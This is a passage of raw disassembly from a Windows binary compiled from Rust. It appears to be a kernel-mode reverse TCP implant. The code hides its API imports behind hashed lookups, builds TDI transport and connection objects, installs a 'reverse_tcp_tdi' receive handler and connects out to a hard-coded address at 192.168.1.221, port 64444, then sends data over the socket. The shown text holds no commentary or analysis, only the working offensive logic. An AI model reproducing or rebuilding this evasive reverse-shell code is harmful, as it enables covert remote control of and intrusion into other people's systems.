0000000061b01420 <_DllMainCRTStartup>:
    61b01420:	41 57                	push   r15
    61b015ed:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b015f1:	48 89 47 18          	mov    QWORD PTR [rdi+0x18],rax
    61b015f5:	48 89 f1             	mov    rcx,rsi
    61b015f8:	48 89 da             	mov    rdx,rbx
    61b015fb:	41 b8 0c 3a d4 73    	mov    r8d,0x73d43a0c
    61b01601:	e8 97 0a 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b01606:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b01609:	0f 84 c6 01 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b0160f:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b01616:	00 
    61b01617:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b0161b:	48 89 47 10          	mov    QWORD PTR [rdi+0x10],rax
    61b0161f:	48 89 f1             	mov    rcx,rsi
    61b01622:	48 89 da             	mov    rdx,rbx
    61b01625:	41 b8 21 f0 cd cb    	mov    r8d,0xcbcdf021
    61b0162b:	e8 6d 0a 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b01630:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b01633:	0f 84 9c 01 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b01639:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b01640:	00 
    61b01641:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b01645:	48 89 47 50          	mov    QWORD PTR [rdi+0x50],rax
    61b01649:	48 89 f1             	mov    rcx,rsi
    61b0164c:	48 89 da             	mov    rdx,rbx
    61b0164f:	41 b8 3f 33 f8 da    	mov    r8d,0xdaf8333f
    61b01655:	e8 43 0a 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b0165a:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b0165d:	0f 84 72 01 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b01663:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b0166a:	00 
    61b0166b:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b0166f:	49 89 04 24          	mov    QWORD PTR [r12],rax
    61b01673:	48 89 f1             	mov    rcx,rsi
    61b01676:	48 89 da             	mov    rdx,rbx
    61b01679:	41 b8 6a 12 10 cb    	mov    r8d,0xcb10126a
    61b0167f:	e8 19 0a 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b01684:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b01687:	0f 84 48 01 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b0168d:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b01694:	00 
    61b01695:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b01699:	49 89 44 24 08       	mov    QWORD PTR [r12+0x8],rax
    61b0169e:	48 89 f1             	mov    rcx,rsi
    61b016a1:	48 89 da             	mov    rdx,rbx
    61b016a4:	41 b8 0e 2a b1 7b    	mov    r8d,0x7bb12a0e
    61b016aa:	e8 ee 09 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b016af:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b016b2:	0f 84 1d 01 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b016b8:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b016bf:	00 
    61b016c0:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b016c4:	49 89 44 24 10       	mov    QWORD PTR [r12+0x10],rax
    61b016c9:	48 89 f1             	mov    rcx,rsi
    61b016cc:	48 89 da             	mov    rdx,rbx
    61b016cf:	41 b8 ab 99 fc 5b    	mov    r8d,0x5bfc99ab
    61b016d5:	e8 c3 09 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b016da:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b016dd:	0f 84 f2 00 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b016e3:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b016ea:	00 
    61b016eb:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b016ef:	49 89 44 24 18       	mov    QWORD PTR [r12+0x18],rax
    61b016f4:	48 89 f1             	mov    rcx,rsi
    61b016f7:	48 89 da             	mov    rdx,rbx
    61b016fa:	41 b8 65 71 e7 85    	mov    r8d,0x85e77165
    61b01700:	e8 98 09 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b01705:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b01708:	0f 84 c7 00 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b0170e:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b01715:	00 
    61b01716:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b0171a:	49 89 44 24 20       	mov    QWORD PTR [r12+0x20],rax
    61b0171f:	48 89 f1             	mov    rcx,rsi
    61b01722:	48 89 da             	mov    rdx,rbx
    61b01725:	41 b8 2f 05 10 88    	mov    r8d,0x8810052f
    61b0172b:	e8 6d 09 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b01730:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b01733:	0f 84 9c 00 00 00    	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b01739:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b01740:	00 
    61b01741:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b01745:	49 89 44 24 28       	mov    QWORD PTR [r12+0x28],rax
    61b0174a:	48 89 f1             	mov    rcx,rsi
    61b0174d:	48 89 da             	mov    rdx,rbx
    61b01750:	41 b8 f2 d5 a4 3e    	mov    r8d,0x3ea4d5f2
    61b01756:	e8 42 09 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b0175b:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b0175e:	74 75                	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b01760:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b01767:	00 
    61b01768:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b0176c:	49 89 44 24 30       	mov    QWORD PTR [r12+0x30],rax
    61b01771:	48 89 f1             	mov    rcx,rsi
    61b01774:	48 89 da             	mov    rdx,rbx
    61b01777:	41 b8 59 80 f3 fc    	mov    r8d,0xfcf38059
    61b0177d:	e8 1b 09 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b01782:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b01785:	74 4e                	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b01787:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b0178e:	00 
    61b0178f:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b01793:	49 89 44 24 38       	mov    QWORD PTR [r12+0x38],rax
    61b01798:	48 89 f1             	mov    rcx,rsi
    61b0179b:	48 89 da             	mov    rdx,rbx
    61b0179e:	41 b8 62 39 db c2    	mov    r8d,0xc2db3962
    61b017a4:	e8 f4 08 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b017a9:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b017ac:	74 27                	je     61b017d5 <_DllMainCRTStartup+0x3b5>
    61b017ae:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b017b5:	00 
    61b017b6:	48 8b 46 08          	mov    rax,QWORD PTR [rsi+0x8]
    61b017ba:	49 89 44 24 40       	mov    QWORD PTR [r12+0x40],rax
    61b017bf:	48 89 f1             	mov    rcx,rsi
    61b017c2:	48 89 da             	mov    rdx,rbx
    61b017c5:	41 b8 31 0c bc 80    	mov    r8d,0x80bc0c31
    61b017cb:	e8 cd 08 00 00       	call   61b0209d <_ZN8resolver16get_proc_address17hc0e35b28d69f1d2fE>
    61b017d0:	83 3e 01             	cmp    DWORD PTR [rsi],0x1
    61b017d3:	75 1e                	jne    61b017f3 <_DllMainCRTStartup+0x3d3>
    61b017d5:	8b 94 24 cc 01 00 00 	mov    edx,DWORD PTR [rsp+0x1cc]
    61b017dc:	48 63 c2             	movsxd rax,edx
    61b017df:	48 81 c4 c8 05 00 00 	add    rsp,0x5c8
    61b017e6:	5b                   	pop    rbx
    61b017e7:	5d                   	pop    rbp
    61b017e8:	5f                   	pop    rdi
    61b017e9:	5e                   	pop    rsi
    61b017ea:	41 5c                	pop    r12
    61b017ec:	41 5d                	pop    r13
    61b017ee:	41 5e                	pop    r14
    61b017f0:	41 5f                	pop    r15
    61b017f2:	c3                   	ret    
    61b017f3:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b017fa:	00 
    61b017fb:	48 8b 6e 08          	mov    rbp,QWORD PTR [rsi+0x8]
    61b017ff:	4c 8d 74 24 38       	lea    r14,[rsp+0x38]
    61b01804:	49 89 3e             	mov    QWORD PTR [r14],rdi
    61b01807:	48 8d 05 e1 04 00 00 	lea    rax,[rip+0x4e1]        # 61b01cef <_ZN15reverse_tcp_tdi12recv_handler17h6851ce6da84e2854E>
    61b0180e:	48 89 47 78          	mov    QWORD PTR [rdi+0x78],rax
    61b01812:	48 8d 9c 24 08 01 00 	lea    rbx,[rsp+0x108]
    61b01819:	00 
    61b0181a:	ba 16 00 00 00       	mov    edx,0x16
    61b0181f:	48 89 d9             	mov    rcx,rbx
    61b01822:	e8 df 04 00 00       	call   61b01d06 <_ZN5ntdef6macros13RtlZeroMemory17hac26330cacaaca8bE>
    61b01827:	49 bf 01 00 00 00 0e 	movabs r15,0x2000e00000001
    61b0182e:	00 02 00 
    61b01831:	4c 89 3b             	mov    QWORD PTR [rbx],r15
    61b01834:	48 b8 54 72 61 6e 73 	movabs rax,0x726f70736e617254
    61b0183b:	70 6f 72 
    61b0183e:	4c 8d ac 24 68 01 00 	lea    r13,[rsp+0x168]
    61b01845:	00 
    61b01846:	49 89 45 00          	mov    QWORD PTR [r13+0x0],rax
    61b0184a:	48 b8 74 41 64 64 72 	movabs rax,0x7373657264644174
    61b01851:	65 73 73 
    61b01854:	49 89 45 08          	mov    QWORD PTR [r13+0x8],rax
    61b01858:	66 c7 44 24 20 16 00 	mov    WORD PTR [rsp+0x20],0x16
    61b0185f:	48 89 f1             	mov    rcx,rsi
    61b01862:	4c 89 ea             	mov    rdx,r13
    61b01865:	41 b0 10             	mov    r8b,0x10
    61b01868:	49 89 d9             	mov    r9,rbx
    61b0186b:	e8 bd 04 00 00       	call   61b01d2d <_ZN5ntdef6macros15make_single_fea17h1d00ac208787236aE>
    61b01870:	48 8d 5c 24 48       	lea    rbx,[rsp+0x48]
    61b01875:	48 89 d9             	mov    rcx,rbx
    61b01878:	4c 89 f2             	mov    rdx,r14
    61b0187b:	49 89 f0             	mov    r8,rsi
    61b0187e:	e8 17 05 00 00       	call   61b01d9a <_ZN5nttdi9TdiSocket8tdi_open17h876cc1c08ad10637E>
    61b01883:	83 3b 01             	cmp    DWORD PTR [rbx],0x1
    61b01886:	74 6f                	je     61b018f7 <_DllMainCRTStartup+0x4d7>
    61b01888:	4c 8d 74 24 48       	lea    r14,[rsp+0x48]
    61b0188d:	49 8b 46 08          	mov    rax,QWORD PTR [r14+0x8]
    61b01891:	49 8b 4e 10          	mov    rcx,QWORD PTR [r14+0x10]
    61b01895:	48 89 47 58          	mov    QWORD PTR [rdi+0x58],rax
    61b01899:	48 89 4f 60          	mov    QWORD PTR [rdi+0x60],rcx
    61b0189d:	48 b8 43 6f 6e 6e 65 	movabs rax,0x697463656e6e6f43
    61b018a4:	63 74 69 
    61b018a7:	48 8d 94 24 08 01 00 	lea    rdx,[rsp+0x108]
    61b018ae:	00 
    61b018af:	48 89 02             	mov    QWORD PTR [rdx],rax
    61b018b2:	48 b8 6f 6e 43 6f 6e 	movabs rax,0x7865746e6f436e6f
    61b018b9:	74 65 78 
    61b018bc:	48 89 42 08          	mov    QWORD PTR [rdx+0x8],rax
    61b018c0:	c6 42 10 74          	mov    BYTE PTR [rdx+0x10],0x74
    61b018c4:	66 c7 44 24 20 08 00 	mov    WORD PTR [rsp+0x20],0x8
    61b018cb:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b018d2:	00 
    61b018d3:	48 89 f1             	mov    rcx,rsi
    61b018d6:	41 b0 11             	mov    r8b,0x11
    61b018d9:	45 31 c9             	xor    r9d,r9d
    61b018dc:	e8 4c 04 00 00       	call   61b01d2d <_ZN5ntdef6macros15make_single_fea17h1d00ac208787236aE>
    61b018e1:	48 8d 54 24 38       	lea    rdx,[rsp+0x38]
    61b018e6:	4c 89 f1             	mov    rcx,r14
    61b018e9:	49 89 f0             	mov    r8,rsi
    61b018ec:	e8 a9 04 00 00       	call   61b01d9a <_ZN5nttdi9TdiSocket8tdi_open17h876cc1c08ad10637E>
    61b018f1:	41 83 3e 01          	cmp    DWORD PTR [r14],0x1
    61b018f5:	75 09                	jne    61b01900 <_DllMainCRTStartup+0x4e0>
    61b018f7:	8b 54 24 4c          	mov    edx,DWORD PTR [rsp+0x4c]
    61b018fb:	e9 dc fe ff ff       	jmp    61b017dc <_DllMainCRTStartup+0x3bc>
    61b01900:	48 8b 44 24 50       	mov    rax,QWORD PTR [rsp+0x50]
    61b01905:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
    61b0190a:	48 89 47 68          	mov    QWORD PTR [rdi+0x68],rax
    61b0190e:	48 89 4f 70          	mov    QWORD PTR [rdi+0x70],rcx
    61b01912:	48 8b 47 58          	mov    rax,QWORD PTR [rdi+0x58]
    61b01916:	4c 8d 4c 24 40       	lea    r9,[rsp+0x40]
    61b0191b:	49 89 01             	mov    QWORD PTR [r9],rax
    61b0191e:	48 8b 57 70          	mov    rdx,QWORD PTR [rdi+0x70]
    61b01922:	48 83 64 24 28 00    	and    QWORD PTR [rsp+0x28],0x0
    61b01928:	48 c7 44 24 20 08 00 	mov    QWORD PTR [rsp+0x20],0x8
    61b0192f:	00 00 
    61b01931:	48 8d 4c 24 38       	lea    rcx,[rsp+0x38]
    61b01936:	41 b0 01             	mov    r8b,0x1
    61b01939:	e8 70 05 00 00       	call   61b01eae <_ZN5nttdi9TdiSocket9tdi_ioctl17h9749a15a95b78aeaE>
    61b0193e:	85 c0                	test   eax,eax
    61b01940:	0f 85 96 fe ff ff    	jne    61b017dc <_DllMainCRTStartup+0x3bc>
    61b01946:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b0194d:	00 
    61b0194e:	c7 06 03 00 00 00    	mov    DWORD PTR [rsi],0x3
    61b01954:	48 8b 47 78          	mov    rax,QWORD PTR [rdi+0x78]
    61b01958:	48 89 46 08          	mov    QWORD PTR [rsi+0x8],rax
    61b0195c:	48 89 7e 10          	mov    QWORD PTR [rsi+0x10],rdi
    61b01960:	48 8b 57 60          	mov    rdx,QWORD PTR [rdi+0x60]
    61b01964:	48 83 64 24 28 00    	and    QWORD PTR [rsp+0x28],0x0
    61b0196a:	48 c7 44 24 20 18 00 	mov    QWORD PTR [rsp+0x20],0x18
    61b01971:	00 00 
    61b01973:	48 8d 4c 24 38       	lea    rcx,[rsp+0x38]
    61b01978:	41 b0 0b             	mov    r8b,0xb
    61b0197b:	49 89 f1             	mov    r9,rsi
    61b0197e:	e8 2b 05 00 00       	call   61b01eae <_ZN5nttdi9TdiSocket9tdi_ioctl17h9749a15a95b78aeaE>
    61b01983:	85 c0                	test   eax,eax
    61b01985:	0f 85 51 fe ff ff    	jne    61b017dc <_DllMainCRTStartup+0x3bc>
    61b0198b:	ba 30 00 00 00       	mov    edx,0x30
    61b01990:	4c 89 f1             	mov    rcx,r14
    61b01993:	e8 6e 03 00 00       	call   61b01d06 <_ZN5ntdef6macros13RtlZeroMemory17hac26330cacaaca8bE>
    61b01998:	ba 30 00 00 00       	mov    edx,0x30
    61b0199d:	48 89 f1             	mov    rcx,rsi
    61b019a0:	e8 61 03 00 00       	call   61b01d06 <_ZN5ntdef6macros13RtlZeroMemory17hac26330cacaaca8bE>
    61b019a5:	ba 16 00 00 00       	mov    edx,0x16
    61b019aa:	4c 89 e9             	mov    rcx,r13
    61b019ad:	e8 54 03 00 00       	call   61b01d06 <_ZN5ntdef6macros13RtlZeroMemory17hac26330cacaaca8bE>
    61b019b2:	48 8d 84 24 a8 00 00 	lea    rax,[rsp+0xa8]
    61b019b9:	00 
    61b019ba:	48 c7 00 00 2e b6 94 	mov    QWORD PTR [rax],0xffffffff94b62e00
    61b019c1:	4c 89 6c 24 70       	mov    QWORD PTR [rsp+0x70],r13
    61b019c6:	c7 44 24 68 16 00 00 	mov    DWORD PTR [rsp+0x68],0x16
    61b019cd:	00 
    61b019ce:	4c 89 bc 24 68 01 00 	mov    QWORD PTR [rsp+0x168],r15
    61b019d5:	00 
    61b019d6:	66 c7 84 24 70 01 00 	mov    WORD PTR [rsp+0x170],0xbcfb
    61b019dd:	00 fb bc 
    61b019e0:	c7 84 24 72 01 00 00 	mov    DWORD PTR [rsp+0x172],0xdd01a8c0
    61b019e7:	c0 a8 01 dd 
    61b019eb:	48 8d 9c 24 08 01 00 	lea    rbx,[rsp+0x108]
    61b019f2:	00 
    61b019f3:	4c 89 73 08          	mov    QWORD PTR [rbx+0x8],r14
    61b019f7:	48 89 73 10          	mov    QWORD PTR [rbx+0x10],rsi
    61b019fb:	48 89 43 18          	mov    QWORD PTR [rbx+0x18],rax
    61b019ff:	48 8b 57 70          	mov    rdx,QWORD PTR [rdi+0x70]
    61b01a03:	48 83 64 24 28 00    	and    QWORD PTR [rsp+0x28],0x0
    61b01a09:	b8 20 00 00 00       	mov    eax,0x20
    61b01a0e:	48 89 44 24 20       	mov    QWORD PTR [rsp+0x20],rax
    61b01a13:	48 8d 4c 24 38       	lea    rcx,[rsp+0x38]
    61b01a18:	41 b0 03             	mov    r8b,0x3
    61b01a1b:	49 89 d9             	mov    r9,rbx
    61b01a1e:	e8 8b 04 00 00       	call   61b01eae <_ZN5nttdi9TdiSocket9tdi_ioctl17h9749a15a95b78aeaE>
    61b01a23:	85 c0                	test   eax,eax
    61b01a25:	0f 85 b1 fd ff ff    	jne    61b017dc <_DllMainCRTStartup+0x3bc>
    61b01a2b:	48 8d b4 24 c8 01 00 	lea    rsi,[rsp+0x1c8]
    61b01a32:	00 
    61b01a33:	c7 06 14 01 00 00    	mov    DWORD PTR [rsi],0x114
    61b01a39:	48 89 f1             	mov    rcx,rsi
    61b01a3c:	ff d5                	call   rbp
    61b01a3e:	48 8d 4c 24 38       	lea    rcx,[rsp+0x38]
    61b01a43:	48 89 f2             	mov    rdx,rsi
    61b01a46:	41 b8 14 01 00 00    	mov    r8d,0x114
    61b01a4c:	e8 77 05 00 00       	call   61b01fc8 <_ZN50_$LT$nttdi..TdiSocket$u20$as$u20$nttdi..Socket$GT$4send17h36146fad852bdf30E>
    61b01a51:	be 04 00 00 00       	mov    esi,0x4
    61b01a56:	48 8d 7c 24 40       	lea    rdi,[rsp+0x40]
